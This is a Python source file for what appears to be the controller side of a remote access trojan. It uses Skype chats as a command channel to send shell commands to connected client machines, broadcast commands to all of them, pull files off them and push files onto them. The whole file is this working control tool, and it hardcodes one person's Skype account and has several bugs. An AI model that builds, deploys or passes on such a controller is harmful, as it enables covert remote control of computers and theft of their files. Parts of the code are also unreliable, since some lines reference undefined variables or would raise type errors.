import cmd
import socket
import sys
import os
from _thread import *
import re
from skpy import Skype, SkypeEventLoop
from skpy.event import SkypeNewMessageEvent
from skpy.msg import SkypeTextMsg, SkypeFileMsg, SkypeImageMsg
from SkypeTools import Connection

ServerSocket = socket.socket()
host = sys.argv[0]
port = int(sys.argv[1])
connections = {}

skype = Skype(os.getenv("SKYPE_USER"), os.getenv("SKYPE_PASS"))
main_chat = skype.chats[f"8:live:{sys.argv[2]}"]

try:
    ServerSocket.bind((host, port))
except socket.error as e:
    main_chat.sendMsg(str(e))

main_chat.sendMsg('Waiting for a Connection..')
ServerSocket.listen(5)

def threaded_client(conn_id):
    global connections
    while True:
        connection = connections[conn_id]
        # If new command
        if connection.cmd:
            print(connection.cmd)
            # Exit
            if connection.cmd == 'exit':
                connection.socket.send(str.encode("exit"))
                data = str(connection.socket.recv(1024),"utf-8")
                if data == "OK":
                    connection.chat.sendMsg(str(conn_id) + " closed successfully")
                    connection.cmd = None
                    break
                else:
                    connection.chat.sendMsg(str(conn_id) + " failed to close successfully")
                    connection.cmd = None
                    break
            # Download
            elif connection.cmd[:2] == 'DL':
                args = connection.cmd.split()
                connection.socket.send(str.encode(f"DL {args[1]}"))
                name = args[1].split("/")[-1]
                print("Downloading...")
                file_data = b''
                data = connection.socket.recv(1024)
                while data[-4:] != str.encode("DONE"):
                    file_data += data
                    connection.socket.send(str.encode("ACK"))
                    data = connection.socket.recv(1024)
                with open(conn_id,"wb") as f:
                    f.write(file_data)
                print("Sending...")
                with open(conn_id,"rb") as f:
                    connection.chat.sendFile(f, name)
            #Upload
            elif connection.cmd[:2] == 'UP':
                name = connection.cmd[3:]
                connection.socket.send(str.encode(f"UP {name}"))
                resp = str(connection.socket.recv(1024),"UTF-8")
                if resp == "READY":
                    with open(conn_id, "wb") as file:
                        file.write(connection.file)
                    with open(conn_id, "rb") as file:
                        data = file.read(1024)
                        while data:
                            connection.socket.send(data)
                            resp = str(connection.socket.recv(1024),"UTF-8")
                            if resp != "ACK":
                                connection.chat.sendMsg(str(num) + " : Something went wrong in file upload")
                                break
                            data = file.read(1024)
                        connection.socket.send(str.encode("DONE"))
                        resp = connection.socket.recv(1024)
                        if resp == b'DONE':
                            connection.chat.sendMsg(str(conn_id) + " : File upload complete")
                        else:
                            connection.chat.sendMsg(str(conn_id) + " : Something went wrong in file upload")
            # All other commands
            else:
                connection.socket.send(str.encode(connection.cmd))
                data = str(connection.socket.recv(1024),"utf-8")
                connection.chat.sendMsg(data)
            connection.cmd = None
    connection.socket.close()
    connection.chat.delete()

def connectionManagement():
    while True:
        # Get a new connection
        Client, address = ServerSocket.accept()
        Client.send(str.encode("whoami"))
        # Get user and format into user@ip:port
        user = str(Client.recv(1024),"utf-8").strip() 
        name = f'{user}@{address[0]}:{str(address[1])}'
        # Notify DM channel
        main_chat.sendMsg("Connected to: " + name)
        # Make new channel for this conneciton only
        new_chat = skype.chats.create(members=("live:josephabbateny",), admins=("live:josephabbateny",))
        new_chat.setTopic(name)
        new_chat.sendMsg(name)
        connection = Connection(name, Client, new_chat)
        connections[new_chat.id] = connection
        start_new_thread(threaded_client, (new_chat.id, ))
        
start_new_thread(connectionManagement, ())

class SkypeManager(SkypeEventLoop):
    def onEvent(self, event):
        if type(event) == SkypeNewMessageEvent:
            if event.msg.user.id != "live:josephabbateny":
                return
            print(type(event.msg))
            data = event.msg.content.strip()
            try:
                target = connections[event.msg.chat.id]
            except:
                target = None
            if event.msg.chat.id == "8:live:josephabbateny":
                if data == "list":
                    out = ""
                    for conn in connections:
                        out += connections[conn].name + "\n"
                    main_chat.sendMsg(out)
                elif data == "exit":
                    for conn in connections:
                        connections[conn].cmd = "exit"
                    done = False
                    while not done:
                        done = True
                        for conn in connections:
                            if connections[conn].cmd:
                                done = False
                    ServerSocket.close()
                
                else:
                    if data[:2] == "UP":
                        keys = list(connections.keys())
                        connections[keys[0]].cmd = data[3:]
                        main_chat.sendMsg("Waiting for connection 0 to finish process...")
                        for i in range(1, len(keys)):
                            while connections[keys[i-1]].cmd:
                                pass
                            connections[keys[i]].cmd = data[3:]
                            main_chat.sendMsg("Waiting for connection " +  i + " to finish process...")
                    elif data[:2] == "DL":
                        keys = list(connections.keys())
                        for i in range(len(keys)):
                            point = data[3:].rfind('\.')-2
                            cmd = data[3:point] + str(i) + data[point:]
                            connections[keys[i]].cmd = data[3:].strip()
                    else:
                        for conn in connections:
                            connections[conn].cmd = data[4:].strip()
            elif target:
                try:
                    if type(event.msg) == SkypeTextMsg:
                        target.cmd = data.strip()
                    elif type(event.msg) == SkypeFileMsg or type(event.msg) == SkypeImageMsg:
                        target.file = event.msg.fileContent
                        target.chat.sendMsg(f"File {event.msg.file.name} ready for use!")
                except:
                    target.chat.sendMsg("Command Failed.")


manager = SkypeManager(os.getenv("SKYPE_USER"), os.getenv("SKYPE_PASS"), autoAck=True)
start_new_thread(manager.loop, ())

while True:
    pass
